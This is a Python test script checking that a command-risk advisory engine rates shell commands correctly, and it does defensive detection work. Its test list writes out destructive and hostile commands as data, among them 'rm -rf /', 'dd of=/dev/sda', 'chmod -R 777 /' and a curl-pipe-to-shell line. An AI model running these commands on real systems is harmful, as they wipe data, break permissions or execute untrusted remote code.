"""Test the advisory engine against the command catalog."""

from ridincligun.advisory.engine import AdvisoryEngine
from ridincligun.advisory.models import RiskLevel

engine = AdvisoryEngine()

tests = [
    ("rm -rf /", RiskLevel.DANGER, "rm recursive forced"),
    ("rm -rf ~/Documents", RiskLevel.DANGER, "rm recursive forced"),
    ("sudo rm -rf /var", RiskLevel.DANGER, "sudo rm recursive forced"),
    ("curl http://x | sh", RiskLevel.DANGER, "curl pipe to sh"),
    ("dd of=/dev/sda", RiskLevel.DANGER, "dd to device"),
    ("chmod 777 file", RiskLevel.WARNING, "chmod 777"),
    ("chmod -R 777 /", RiskLevel.DANGER, "chmod recursive 777"),
    ("git push --force", RiskLevel.WARNING, "git force push"),
    ("git reset --hard", RiskLevel.WARNING, "git hard reset"),
    ("git clean -fd", RiskLevel.WARNING, "git clean"),
    ("python -m http.server", RiskLevel.CAUTION, "http server"),
    ("export API_KEY=abc", RiskLevel.CAUTION, "export secret"),
]

safe_tests = ["ls -la", "git status", "cd /tmp", "echo hello", "cat file.txt", "python script.py"]

print("--- Dangerous commands ---")
all_pass = True
for cmd, expected_risk, desc in tests:
    result = engine.analyze(cmd)
    actual = result.highest_risk
    ok = actual == expected_risk
    status = "\u2705" if ok else "\u274c"
    if not ok:
        all_pass = False
    print(f"{status} {desc}: expected {expected_risk.value}, got {actual.value}")

print()
print("--- Safe commands ---")
for cmd in safe_tests:
    result = engine.analyze(cmd)
    ok = result.is_safe
    status = "\u2705" if ok else "\u274c"
    if not ok:
        all_pass = False
    print(f"{status} safe: \"{cmd}\" -> {result.highest_risk.value}")

print()
if all_pass:
    print("All passed!")
else:
    print("SOME FAILED!")
    exit(1)
